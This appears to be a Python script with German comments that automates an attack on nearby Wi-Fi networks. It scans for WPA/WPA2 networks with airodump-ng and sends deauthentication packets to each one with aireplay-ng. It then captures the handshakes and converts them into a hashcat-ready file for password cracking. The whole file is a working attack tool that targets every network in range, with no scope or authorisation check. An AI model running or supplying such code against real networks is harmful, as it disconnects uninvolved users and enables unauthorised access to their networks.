import os
import subprocess
import time
import glob

INTERFACE = "wlan1"
HANDSHAKE_DIR = "/home/pi/handshakes"
SCAN_TIME = 60  # Zeit für Netzwerkscan in Sekunden
HANDSHAKE_WAIT_TIME = 60  # Zeit für Handshake-Erfassung pro Netzwerk
DEAUTH_COUNT = 10  # Anzahl der Deauth-Pakete, die gesendet werden

def setup():
    # Handshake-Verzeichnis erstellen, falls es nicht existiert
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)

def scan_networks():
    print("[*] Starte Netzwerkscan...")
    scan_process = subprocess.Popen(
        ["sudo", "airodump-ng", "--band", "abg", "-w", HANDSHAKE_DIR + "/scan", "--output-format", "csv", INTERFACE],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(SCAN_TIME)
    scan_process.terminate()
    return HANDSHAKE_DIR + "/scan-01.csv"

def parse_networks(scan_file):
    networks = []
    with open(scan_file, "r") as f:
        for line in f:
            if "WPA" in line and "WPA2" in line:
                fields = line.split(',')
                if len(fields) > 1:
                    bssid = fields[0].strip()
                    channel = fields[3].strip()
                    networks.append((bssid, channel))
    print(f"[*] {len(networks)} Netzwerke gefunden.")
    return networks

def send_deauth(bssid):
    print(f"[*] Sende Deauth-Pakete an {bssid}...")
    deauth_cmd = [
        "sudo", "aireplay-ng", "--deauth", str(DEAUTH_COUNT), "-a", bssid, INTERFACE
    ]
    subprocess.call(deauth_cmd)

def capture_handshake(bssid, channel):
    print(f"[*] Erfasse Handshake für {bssid} auf Kanal {channel}...")
    airodump_cmd = [
        "sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w",
        f"{HANDSHAKE_DIR}/{bssid}", INTERFACE
    ]
    airodump_process = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Warte, bis der Handshake erfasst wurde
    handshake_captured = False
    start_time = time.time()

    while time.time() - start_time < HANDSHAKE_WAIT_TIME:
        output = subprocess.check_output(
            ["sudo", "airodump-ng", "--bssid", bssid, "--write", "/dev/stdout", INTERFACE],
            stderr=subprocess.STDOUT
        ).decode()

        if "WPA handshake" in output:
            print("[*] Handshake erfolgreich erfasst!")
            handshake_captured = True
            break
        time.sleep(5)  # Wartezeit vor der nächsten Überprüfung

    airodump_process.terminate()

    if not handshake_captured:
        print("[!] Handshake nicht erfasst. Möglicherweise war der Angriff nicht erfolgreich.")

def convert_and_cleanup():
    print("[*] Konvertiere und bereinige Dateien...")
    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.cap")
    if not cap_files:
        print("[!] Keine .cap-Dateien gefunden.")
        return
    # Erstelle eine einzige .hccapx Datei aus allen .cap Dateien
    hccapx_file = os.path.join(HANDSHAKE_DIR, "handshake.hccapx")
    conversion_cmd = ["hcxpcapngtool", "-o", hccapx_file] + cap_files
    subprocess.call(conversion_cmd)
    print(f"[*] Handshake-Datei erstellt: {hccapx_file}")
    # Lösche alle .cap-Dateien nach der Konvertierung
    for cap_file in cap_files:
        os.remove(cap_file)
    print("[*] Alle .cap-Dateien wurden gelöscht.")

def main():
    setup()
    scan_file = scan_networks()
    networks = parse_networks(scan_file)
    for bssid, channel in networks:
        send_deauth(bssid)  # Deauth-Pakete senden
        capture_handshake(bssid, channel)  # Handshake erfassen
    convert_and_cleanup()

if __name__ == "__main__":
    main()
